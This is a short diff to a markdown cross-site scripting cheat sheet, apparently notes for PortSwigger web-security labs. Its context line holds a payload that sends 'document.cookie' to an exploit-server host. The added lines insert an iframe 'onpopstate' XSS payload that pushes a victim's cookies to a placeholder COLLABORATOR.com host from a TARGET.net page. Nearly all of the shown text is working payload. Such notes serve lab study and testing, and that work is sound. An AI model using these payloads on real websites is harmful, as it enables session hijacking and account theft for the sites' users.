@@ -84,6 +84,10 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 ```  
 
 [Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
+```JavaScript
+<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
+
+```  
 
 >OnHashChange **'#'** XSS  
   
